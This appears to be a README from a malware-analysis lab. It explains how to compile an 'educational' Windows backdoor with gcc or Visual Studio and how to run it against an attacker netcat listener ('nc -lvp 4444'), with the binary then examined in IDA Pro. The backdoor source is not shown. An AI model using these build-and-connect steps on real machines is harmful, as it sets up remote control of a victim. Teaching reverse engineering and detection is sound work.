# Compilation Instructions for Educational Backdoor

## Prerequisites
- Windows OS
- MinGW-GCC or Visual Studio installed
- IDA Pro (for analysis)

## Compilation Options

### Option 1: Using MinGW GCC (Recommended)
```bash
gcc simple_backdoor.c -o simple_backdoor.exe -lws2_32 -Wall
```

### Option 2: Using Visual Studio Developer Command Prompt
```bash
cl simple_backdoor.c ws2_32.lib /Fe:simple_backdoor.exe
```

### Option 3: With Debug Symbols (for easier IDA analysis)
```bash
gcc simple_backdoor.c -o simple_backdoor_debug.exe -lws2_32 -g -Wall
```

### Option 4: Without Debug Symbols (realistic scenario)
```bash
gcc simple_backdoor.c -o simple_backdoor_release.exe -lws2_32 -O2 -s
```

## Running the Sample

**WARNING: Only run in isolated lab environment!**

```bash
# Run with default settings (127.0.0.1:4444)
simple_backdoor.exe

# Run with custom IP and port
simple_backdoor.exe 192.168.1.100 5555
```

## Setting Up Test Environment

1. In one terminal (attacker simulation):
```bash
nc -lvp 4444
```

2. In another terminal (victim):
```bash
simple_backdoor.exe 127.0.0.1 4444
```

## Next Steps
After compilation, open the .exe file in IDA Pro for analysis.
Refer to IDA_ANALYSIS_GUIDE.md for detection techniques.
